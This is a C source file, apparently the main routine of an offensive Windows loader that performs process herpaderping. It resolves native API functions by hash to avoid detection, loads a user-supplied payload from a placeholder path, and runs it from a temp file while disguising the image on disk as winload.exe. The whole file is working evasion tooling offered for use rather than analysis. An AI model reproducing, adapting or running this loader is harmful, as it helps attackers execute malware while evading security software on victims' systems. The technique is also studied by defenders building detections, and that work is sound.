#include <Windows.h>
#include <stdio.h>
#include "globals.h"
#include "obfuscation.h"
#include "resolver.h"
#include "disk_io.h"
#include "injector.h"

NtApiFunctionTable GlobalNtApiTable = { 0 };

#define PAYLOAD_PATH L"Type Your Payload Path Here"
#define LEGIT_IMAGE_PATH L"C:\\Windows\\System32\\winload.exe"
#define COMMAND_ARGUMENT L"NULL" // if paylaod take argument

int main() {
    HMODULE ntdllHandle;
    HMODULE userEnvHandle;
    WCHAR tempFileName[MAX_PATH] = { 0x00 };
    WCHAR tempPath[MAX_PATH] = { 0x00 };
    WCHAR tempFilePath[MAX_PATH * 2] = { 0x00 };
    PBYTE payloadBuffer = NULL;
    DWORD payloadSize = 0x00;

    // Get ntdll.dll handle using hash
    ntdllHandle = GetModuleHandleHash(0x22d3b5ed);
    if (!ntdllHandle) { 
        fprintf(stderr, "[-] Failed to get HMODULE on ntdll.dll\n"); 
        return 1; 
    }
    printf("[+] Got Handle on ntdll.dll 0x%p\n", ntdllHandle);

    userEnvHandle = LoadLibraryW(L"userenv.dll");
    if (!userEnvHandle) { 
        fprintf(stderr, "[-] Failed to Get Module on userenv.dll\n"); 
        return 1; 
    }
    printf("[+] Got Handle on userenv.dll 0x%p\n", userEnvHandle);

    GlobalNtApiTable.NtOpenProcess = (fn_NtOpenProcess)ResolveFunctionAddress(ntdllHandle, 0x5003c058);
    GlobalNtApiTable.NtCreateFile = (fn_NtCreateFile)ResolveFunctionAddress(ntdllHandle, 0x15a5ecdb);
    GlobalNtApiTable.NtCreateSection = (fn_NtCreateSection)ResolveFunctionAddress(ntdllHandle, 0xd02e20d0);
    GlobalNtApiTable.NtCreateProcessEx = (fn_NtCreateProcessEx)ResolveFunctionAddress(ntdllHandle, 0xa9e925b7);
    GlobalNtApiTable.NtWriteFile = (fn_NtWriteFile)ResolveFunctionAddress(ntdllHandle, 0xd69326b2);
    GlobalNtApiTable.NtQuerySystemInformation = (fn_NtQuerySystemInformation)ResolveFunctionAddress(ntdllHandle, 0xee4f73a8);
    GlobalNtApiTable.NtClose = (fn_NtClose)ResolveFunctionAddress(ntdllHandle, 0x8b8e133d);
    GlobalNtApiTable.NtAllocateVirtualMemory = (fn_NtAllocateVirtualMemory)ResolveFunctionAddress(ntdllHandle, 0x6793c34c);
    GlobalNtApiTable.NtCreateThreadEx = (fn_NtCreateThreadEx)ResolveFunctionAddress(ntdllHandle, 0xcb0c2130);
    GlobalNtApiTable.RtlCreateProcessParametersEx = (fn_RtlCreateProcessParametersEx)ResolveFunctionAddress(ntdllHandle, 0x19132cbb);
    GlobalNtApiTable.NtWriteVirtualMemory = (fn_NtWriteVirtualMemory)ResolveFunctionAddress(ntdllHandle, 0x95f3a792);
    GlobalNtApiTable.NtQueryInformationFile = (fn_NtQueryInformationFile)ResolveFunctionAddress(ntdllHandle, 0x4725f863);
    GlobalNtApiTable.NtQueryInformationProcess = (fn_NtQueryInformationProcess)ResolveFunctionAddress(ntdllHandle, 0xd034fc62);
    GlobalNtApiTable.NtReadVirtualMemory = (fn_NtReadVirtualMemory)ResolveFunctionAddress(ntdllHandle, 0xc24062e3);
    GlobalNtApiTable.RtlInitUnicodeString = (fn_RtlInitUnicodeString)ResolveFunctionAddress(ntdllHandle, 0x29b75f89);
    GlobalNtApiTable.CreateEnvironmentBlock = (fn_CreateEnvironmentBlock)ResolveFunctionAddress(userEnvHandle, 0x6cd41b79);

    if (!GlobalNtApiTable.CreateEnvironmentBlock || !GlobalNtApiTable.RtlInitUnicodeString || 
        !GlobalNtApiTable.NtReadVirtualMemory || !GlobalNtApiTable.NtOpenProcess || 
        !GlobalNtApiTable.NtCreateFile || !GlobalNtApiTable.NtCreateSection || 
        !GlobalNtApiTable.NtCreateProcessEx || !GlobalNtApiTable.NtWriteFile || 
        !GlobalNtApiTable.NtQuerySystemInformation || !GlobalNtApiTable.NtClose || 
        !GlobalNtApiTable.NtAllocateVirtualMemory || !GlobalNtApiTable.NtCreateThreadEx || 
        !GlobalNtApiTable.RtlCreateProcessParametersEx || !GlobalNtApiTable.NtWriteVirtualMemory || 
        !GlobalNtApiTable.NtQueryInformationFile || !GlobalNtApiTable.NtQueryInformationProcess) { 
        fprintf(stderr, "[-] Some NtFunction Missing Check Again\n"); 
        return 1; 
    }

    if (GetTempPathW(MAX_PATH, tempPath) == 0) {
        fprintf(stderr, "[-] GetTempPathW With error code : %d\n", GetLastError());
        return 1;
    }

    if (GetTempFileNameW(tempPath, L"UFO", 0, tempFileName) == 0) {
        fprintf(stderr, "[-] GetTempFileNameW With error code : %d\n", GetLastError());
        return 1;
    }

    printf("[+] Created Temp Path: %ws\n", tempFileName);
    swprintf_s(tempFilePath, MAX_PATH * 2, L"%s", tempFileName);
    // swprintf_s(tempFilePath, MAX_PATH * 2, L"%s %s", tempFileName,COMMAND_ARGUMENT); // for argument
    

    if (!LoadFileIntoMemory(PAYLOAD_PATH, &payloadBuffer, &payloadSize)) {
        fprintf(stderr, "[-] LoadFileIntoMemory Failed \n");
        return 1;
    }

    if (!ExecuteHerpaderping(tempFilePath, LEGIT_IMAGE_PATH, payloadBuffer, payloadSize)) {
        fprintf(stderr, "[-] ExecuteHerpaderping Failed\n");
        return 1;
    }

    return 0;
}
